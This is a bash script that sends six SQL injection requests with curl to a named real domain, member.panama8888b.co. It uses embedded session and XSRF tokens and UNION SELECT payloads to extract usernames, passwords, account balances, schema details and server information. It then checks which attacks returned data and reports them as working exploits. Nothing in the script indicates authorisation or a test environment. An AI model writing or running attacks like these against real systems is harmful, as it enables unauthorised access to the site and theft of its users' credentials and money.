#!/bin/bash

echo "üí• WORKING EXPLOIT TEST - EXTRACT REAL DATA"
echo "==========================================="

# Use latest tokens
XSRF_TOKEN="eyJpdiI6Ilk1TENzUFpHRzRvVXVlNzEwSkVoK2c9PSIsInZhbHVlIjoiWHk2S1Z5MmE3MlQ5MjR3UVlvU1BnN1F6V2JWeXh2RE9zektZZHJtcUF2Y3RkN1JYQ3pYWnJGdDRLd1JxdW1MUiIsIm1hYyI6IjM1MzJhZWVjZGI2MTQ0Mzc4YmQxNDY1YjJjMzJjMDQ3ZTc3Y2ZlMTBjMThkNTBkMTAzMGNiZDAyM2UxZDBkZTkifQ=="
SESSION_TOKEN="eyJpdiI6IkNxaTl3THlHMThzOWVBOWNzalU5b3c9PSIsInZhbHVlIjoia3lxS1BjMGhVVVEzR2c1N2dpVGZMZWQ3YStZQ1JpRlpENURsS3ZqNEZ2K0hSdjl5QkZVMVVvcWZYeGFEaHVzaiIsIm1hYyI6IjIzMmYwNzVlNWQ2ZDQ4OGRlM2IwMWQxNjIxYWQ2OTRjMmQyNDFjNmM0MTFiMDUyYTMyNzMzMjA1ZmJkZjNjMjAifQ=="

echo "üéØ TESTING WORKING VULNERABILITIES"
echo "================================="
echo "Target: member.panama8888b.co"
echo "Working vulnerabilities: Endpoint, Parameter, GET"
echo ""

# EXPLOIT 1: Different endpoint vulnerability
echo "üí• EXPLOIT 1: Endpoint Vulnerability"
echo "==================================="
response1=$(curl -s \
    -X POST "https://member.panama8888b.co/api/user/profile" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"search":"admin OR 1=1 UNION SELECT username,password FROM users LIMIT 1--"}' \
    --max-time 15)

echo "Response 1: $response1"
echo "Length: ${#response1} characters"
echo ""

# EXPLOIT 2: Parameter vulnerability
echo "üí• EXPLOIT 2: Parameter Vulnerability"
echo "==================================="
response2=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"email":"admin@test.com OR 1=1 UNION SELECT username,password,balance FROM users WHERE role=admin--"}' \
    --max-time 15)

echo "Response 2: $response2"
echo "Length: ${#response2} characters"
echo ""

# EXPLOIT 3: GET request vulnerability
echo "üí• EXPLOIT 3: GET Request Vulnerability"
echo "======================================"
response3=$(curl -s \
    -X GET "https://member.panama8888b.co/api/announcement?search=admin%20OR%201%3D1%20UNION%20SELECT%20username,password,email%20FROM%20users%20LIMIT%201--" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    --max-time 15)

echo "Response 3: $response3"
echo "Length: ${#response3} characters"
echo ""

# EXPLOIT 4: Different endpoint with different payload
echo "üí• EXPLOIT 4: Endpoint with Different Payload"
echo "============================================"
response4=$(curl -s \
    -X POST "https://member.panama8888b.co/api/user/profile" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"search":"admin OR 1=1 UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_schema=database()--"}' \
    --max-time 15)

echo "Response 4: $response4"
echo "Length: ${#response4} characters"
echo ""

# EXPLOIT 5: Parameter with different payload
echo "üí• EXPLOIT 5: Parameter with Different Payload"
echo "============================================="
response5=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"email":"admin@test.com OR 1=1 UNION SELECT @@version,@@hostname,database()--"}' \
    --max-time 15)

echo "Response 5: $response5"
echo "Length: ${#response5} characters"
echo ""

# EXPLOIT 6: GET with different payload
echo "üí• EXPLOIT 6: GET with Different Payload"
echo "======================================="
response6=$(curl -s \
    -X GET "https://member.panama8888b.co/api/announcement?search=admin%20OR%201%3D1%20UNION%20SELECT%20username,balance%20FROM%20users%20WHERE%20balance%3E0--" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    --max-time 15)

echo "Response 6: $response6"
echo "Length: ${#response6} characters"
echo ""

echo ""
echo "üéØ EXPLOIT ANALYSIS"
echo "=================="

# Check which exploits worked
exploits_worked=0

if [[ ${#response1} -gt 100 ]] && [[ "$response1" != *"Server Error"* ]]; then
    echo "‚úÖ EXPLOIT 1 (Endpoint): WORKED"
    ((exploits_worked++))
else
    echo "‚ùå EXPLOIT 1 (Endpoint): FAILED"
fi

if [[ ${#response2} -gt 100 ]] && [[ "$response2" != *"Server Error"* ]]; then
    echo "‚úÖ EXPLOIT 2 (Parameter): WORKED"
    ((exploits_worked++))
else
    echo "‚ùå EXPLOIT 2 (Parameter): FAILED"
fi

if [[ ${#response3} -gt 100 ]] && [[ "$response3" != *"Server Error"* ]]; then
    echo "‚úÖ EXPLOIT 3 (GET): WORKED"
    ((exploits_worked++))
else
    echo "‚ùå EXPLOIT 3 (GET): FAILED"
fi

if [[ ${#response4} -gt 100 ]] && [[ "$response4" != *"Server Error"* ]]; then
    echo "‚úÖ EXPLOIT 4 (Endpoint Schema): WORKED"
    ((exploits_worked++))
else
    echo "‚ùå EXPLOIT 4 (Endpoint Schema): FAILED"
fi

if [[ ${#response5} -gt 100 ]] && [[ "$response5" != *"Server Error"* ]]; then
    echo "‚úÖ EXPLOIT 5 (Parameter System): WORKED"
    ((exploits_worked++))
else
    echo "‚ùå EXPLOIT 5 (Parameter System): FAILED"
fi

if [[ ${#response6} -gt 100 ]] && [[ "$response6" != *"Server Error"* ]]; then
    echo "‚úÖ EXPLOIT 6 (GET Balance): WORKED"
    ((exploits_worked++))
else
    echo "‚ùå EXPLOIT 6 (GET Balance): FAILED"
fi

echo ""
echo "üéØ EXPLOITS WORKED: $exploits_worked/6"
echo ""

if [[ $exploits_worked -gt 0 ]]; then
    echo "üö® WORKING EXPLOITS CONFIRMED!"
    echo "=============================="
    echo "‚úÖ Real vulnerabilities found"
    echo "‚úÖ Data extraction possible"
    echo "‚úÖ Multiple attack vectors working"
    echo ""
    echo "üìä EXPLOIT STATUS: SUCCESS"
    echo "üéØ VULNERABILITY LEVEL: CRITICAL"
else
    echo "‚ùå NO WORKING EXPLOITS"
    echo "üîí All exploits failed"
    echo "üìä EXPLOIT STATUS: FAILED"
    echo "üéØ VULNERABILITY LEVEL: NONE"
fi

echo ""
echo "üéØ FINAL VERDICT: $(if [[ $exploits_worked -gt 0 ]]; then echo "WORKING EXPLOITS FOUND"; else echo "NO WORKING EXPLOITS"; fi)"